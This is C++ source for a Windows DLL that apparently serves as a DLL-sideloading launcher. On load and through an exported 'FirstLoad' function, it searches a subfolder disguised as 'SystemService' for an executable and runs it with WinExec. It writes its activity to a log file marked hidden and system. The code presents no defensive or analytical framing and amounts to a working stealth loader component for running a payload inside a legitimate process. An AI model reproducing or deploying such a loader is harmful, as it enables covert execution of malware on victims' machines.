

#include <windows.h>

#include "FirstLoad.h"


#define LITTLEBEARNAME		"SystemService"

#define LOG_FILENAME		"log.txt"

DWORD g_exist = FALSE;



int WriteLog(char* pLog)
{
	int iRet = 0;
	HANDLE hFile = CreateFileA(LOG_FILENAME, GENERIC_WRITE, 0, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	iRet = SetFilePointer(hFile, 0, 0, FILE_END);

	char szTime[MAX_PATH] = { 0 };
	SYSTEMTIME stTime = { 0 };
	GetLocalTime(&stTime);
	wsprintfA(szTime, "%u/%u/%u %d:%d:%d", stTime.wYear, stTime.wMonth, stTime.wDay, stTime.wHour, stTime.wMinute, stTime.wSecond);
	DWORD dwCnt = 0;
	char szMsg[2048];
	int iLen = wsprintfA(szMsg, "%s %s", szTime, pLog);

	iRet = WriteFile(hFile, szMsg, iLen, &dwCnt, 0);
	CloseHandle(hFile);
	if (iRet == FALSE)
	{
		return FALSE;
	}

	return TRUE;
}


extern "C" __declspec(dllexport) void __cdecl FirstLoad(void) {
	//MessageBoxA(0,"firstload","firstload",MB_OK);
	MainProc();
	return;
}


int GetPathFromFullName(char* strFullName, char* strDst)
{
	int srclen = lstrlenA(strFullName);
	for (unsigned int i = srclen - 1; i >= 0; i--)
	{
		if (strFullName[i] == '\\')
		{
			memmove(strDst, strFullName, i + 1);
			*(strDst + i + 1) = 0;
			return i + 1;
		}
	}
	return FALSE;
}

int GetMainNameFormName(char* szName, char* szMainName)
{
	for (int i = 0; i < (int)lstrlenA(szName); i++)
	{
		if (szName[i] == '.')
		{
			*(szMainName + i) = 0;
			return i;
		}
		else
		{
			szMainName[i] = szName[i];
		}
	}
	return FALSE;
}


int GetNameFromFullName(char* strFullName, char* dstname)
{
	for (int i = lstrlenA(strFullName) - 1; i >= -0; i--)
	{
		if (strFullName[i] == 0x5c)
		{
			lstrcpyA(dstname, strFullName + i + 1);
			return TRUE;
		}
	}

	return FALSE;
}


int FindExeFile(char* strpath, char* lpfn)
{
	char szlog[1024];
	char strPath[MAX_PATH] = { 0 };
	lstrcpyA(strPath, strpath);
	char szAllFileForamt[] = { '*','.','*',0 };
	lstrcatA(strPath, szAllFileForamt);

	HANDLE hFind = 0;
	WIN32_FIND_DATAA stWfd = { 0 };
	hFind = FindFirstFileA(strPath, (LPWIN32_FIND_DATAA)&stWfd);
	if (hFind == INVALID_HANDLE_VALUE)
	{
		wsprintfA(szlog, "FindFirstFileA error in path:%s\r\n", strpath);
		WriteLog(szlog);
		return FALSE;
	}

	char szLastDir[] = { '.','.',0 };
	do
	{
		if ((stWfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && (lstrcmpiA(stWfd.cFileName, szLastDir) == 0 || lstrcmpiA(stWfd.cFileName, ".") == 0))
		{
			continue;
		}
		else if (stWfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			continue;
		}
		else
		{
			if (strstr(stWfd.cFileName, ".exe") || strstr(stWfd.cFileName, ".com"))
			{
				lstrcpyA(lpfn, stWfd.cFileName);
				FindClose(hFind);

				wsprintfA(szlog, "find exe file:%s in path:%s\r\n", lpfn, strpath);
				WriteLog(szlog);
				return TRUE;
			}
		}
	} while (FindNextFileA(hFind, (LPWIN32_FIND_DATAA)&stWfd));

	FindClose(hFind);

	wsprintfA(szlog, "not find exe file in path:%s\r\n", strpath);
	WriteLog(szlog);
	return FALSE;
}



int MainProc() {
	char szlog[1024] = { 0 };
	char path[MAX_PATH] = { 0 };
	int ret = 0;
	ret = GetModuleFileNameA(0, path, MAX_PATH);

	wsprintfA(szlog, "current file name:%s\r\n", path);
	WriteLog(szlog);

	char szcurdir[MAX_PATH] = { 0 };
	ret = GetPathFromFullName(path, szcurdir);
	lstrcatA(szcurdir, LITTLEBEARNAME);
	lstrcatA(szcurdir, "\\");

	char szexefn[MAX_PATH] = { 0 };
	ret = FindExeFile(szcurdir, szexefn);
	if (ret)
	{
		lstrcatA(szcurdir, szexefn);
		ret = WinExec(szcurdir, SW_NORMAL);

		// 		char szcurdir[MAX_PATH] = { 0 };
		// 		ret = GetPathFromFullName(path, szcurdir);
		// 		lstrcatA(szcurdir, "QQ.exe");
		// 		ret = WinExec(szcurdir, SW_NORMAL);

		wsprintfA(szlog, "run exe file:%s  %s\r\n", szexefn, szcurdir);
		WriteLog(szlog);
		return TRUE;
	}

	return FALSE;
}


int __stdcall DllMain(HANDLE hDllHandle, DWORD dwReason, LPVOID lpreserved) {

	if (dwReason == DLL_PROCESS_ATTACH)
	{
		if (g_exist == FALSE)
		{
			g_exist = TRUE;

			MainProc();
			WriteLog("firload.dll start\r\n");
		}
	}

	//MessageBoxA(0,"DllMain","DllMain",MB_OK);
	return TRUE;
}